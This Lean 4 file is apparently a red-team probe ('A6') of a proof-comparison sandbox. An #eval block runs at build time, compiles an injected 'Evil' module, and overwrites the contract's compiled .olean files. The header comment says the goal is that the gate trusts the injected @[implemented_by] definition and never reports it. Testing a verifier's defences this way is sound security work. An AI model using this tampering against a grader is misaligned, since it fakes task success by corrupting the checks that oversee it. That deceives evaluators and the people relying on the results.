import RecursionFast.Contract
/-! A6 probe: a solution module whose *elaboration* (i.e. `lake build` of the solution, which the
comparator sandbox runs with write access to the project's `.lake`) rewrites the contract's
`.olean`s. The rewritten contract root imports a new module `RecursionFast.Contract.Evil`, which
the gate then trusts "by import graph", so its `@[implemented_by]` is never reported. -/

def evilSrc : String := "
namespace RecursionFast
def shownVk : Nat := 1337
@[implemented_by shownVk] def evilVk : Nat := 0
end RecursionFast
"

def rootSrc : String := "
import RecursionFast.Contract.Evil
namespace RecursionFast
structure Sub where
  vk : Nat
end RecursionFast
"

#eval show IO Unit from do
  let lib := ".lake/build/lib/lean/RecursionFast"
  IO.FS.createDirAll s!"{lib}/Contract"
  IO.FS.createDirAll "/tmp/a6tamper/RecursionFast/Contract"
  IO.FS.writeFile "/tmp/a6tamper/RecursionFast/Contract/Evil.lean" evilSrc
  IO.FS.writeFile "/tmp/a6tamper/RecursionFast/Contract.lean" rootSrc
  let lp := (← IO.getEnv "LEAN_PATH").getD ""
  let env := #[("LEAN_PATH", some s!"{lp}:{(← IO.currentDir)}/.lake/build/lib/lean")]
  let r1 ← IO.Process.output { cmd := (← IO.appPath).toString, args := #["--root=/tmp/a6tamper", "-o", s!"{lib}/Contract/Evil.olean",
    "/tmp/a6tamper/RecursionFast/Contract/Evil.lean"], env }
  -- compile the new root into a temp file first (it must not read itself), then move it in place
  let r2 ← IO.Process.output { cmd := (← IO.appPath).toString, args := #["--root=/tmp/a6tamper", "-o", "/tmp/a6tamper/Contract.olean",
    "/tmp/a6tamper/RecursionFast/Contract.lean"], env }
  IO.println s!"tamper: evil {r1.exitCode} {r1.stdout} {r1.stderr} root {r2.exitCode} {r2.stdout} {r2.stderr}"
  IO.FS.writeBinFile s!"{lib}/Contract.olean.new" (← IO.FS.readBinFile "/tmp/a6tamper/Contract.olean")
  -- rename, not overwrite: this process has the old root mmapped
  IO.FS.rename s!"{lib}/Contract.olean.new" s!"{lib}/Contract.olean"
  IO.println s!"tamper: evil {r1.exitCode} {r1.stderr} root {r2.exitCode} {r2.stderr}"
